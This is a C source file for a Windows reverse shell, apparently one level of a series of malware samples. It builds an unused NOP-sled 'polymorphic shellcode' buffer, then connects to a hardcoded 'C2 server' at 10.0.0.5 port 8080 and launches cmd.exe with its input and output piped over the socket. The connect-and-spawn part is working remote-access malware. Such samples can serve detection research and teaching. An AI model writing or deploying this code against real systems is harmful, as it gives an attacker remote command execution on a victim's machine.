// Windows port of level4_polymorphicReverseShell
// Polymorphic shellcode with NOP sled and WinSock2

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

// Generate polymorphic shellcode with variable NOP sled
char *generate_polymorphic_shellcode() {
    srand(time(NULL));

    // Inline Windows shellcode template for socket creation
    // Note: This is simplified - real shellcode would be more complex
    unsigned char template_code[] = {
        0x90, 0x90, 0x90, 0x90,   // NOPs for alignment
        0x48, 0x31, 0xc0,          // xor rax, rax
        0x48, 0x31, 0xff,          // xor rdi, rdi
        0x48, 0x31, 0xf6,          // xor rsi, rsi
        0x48, 0x31, 0xd2,          // xor rdx, rdx
        0x48, 0x31, 0xc9,          // xor rcx, rcx
        0x48, 0x31, 0xdb,          // xor rbx, rbx
        0xc3                       // ret (placeholder)
    };

    // Variable-length NOP sled (polymorphic behavior)
    int sled_size = rand() % 512 + 256;
    char *nop_sled = malloc(sled_size);

    for(int i = 0; i < sled_size; i++) {
        nop_sled[i] = 0x90; // NOP instruction
    }

    // Combine NOP sled + shellcode template
    int template_size = sizeof(template_code);
    char *final = malloc(sled_size + template_size + 1);
    memcpy(final, nop_sled, sled_size);
    memcpy(final + sled_size, template_code, template_size);

    free(nop_sled);
    return final;
}

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // Generate polymorphic shellcode (for RE analysis)
    char *shellcode = generate_polymorphic_shellcode();

    // Initialize WinSock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        free(shellcode);
        return 1;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        free(shellcode);
        return 1;
    }

    // Configure C2 server address
    server.sin_family = AF_INET;
    server.sin_port = htons(8080);
    inet_pton(AF_INET, "10.0.0.5", &server.sin_addr);

    // Connect to C2 server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        free(shellcode);
        return 1;
    }

    // Setup process startup info to redirect I/O
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    ZeroMemory(&pi, sizeof(pi));

    // Spawn cmd.exe shell with I/O redirected to socket
    if (!CreateProcessA(
        "C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        TRUE,  // Inherit handles
        0,
        NULL,
        NULL,
        &si,
        &pi)) {
        closesocket(sock);
        WSACleanup();
        free(shellcode);
        return 1;
    }

    // Wait for shell to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
    free(shellcode);

    return 0;
}
